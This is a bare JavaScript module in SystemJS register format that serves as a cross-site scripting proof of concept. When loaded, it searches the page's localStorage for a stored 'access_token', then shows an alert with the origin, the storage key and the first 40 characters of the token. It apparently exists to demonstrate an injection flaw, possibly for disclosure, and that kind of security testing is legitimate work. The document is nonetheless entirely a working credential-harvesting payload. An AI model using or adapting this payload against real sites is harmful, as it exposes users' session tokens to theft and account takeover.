System.register([], function () {
  return { execute: function () {
    var found = null, key = null;
    try {
      for (var i = 0; i < localStorage.length; i++) {
        var k = localStorage.key(i);
        try {
          var v = JSON.parse(localStorage.getItem(k));
          if (v && v.body && v.body.access_token) { found = v.body.access_token; key = k; break; }
        } catch (e) {}
      }
    } catch (e) {}
    alert("XSS executing in origin: " + location.origin +
          "\nToken key: " + (key || "none") +
          "\naccess_token (first 40): " + (found ? String(found).slice(0, 40) + "…" : "(none)"));
  }};
});
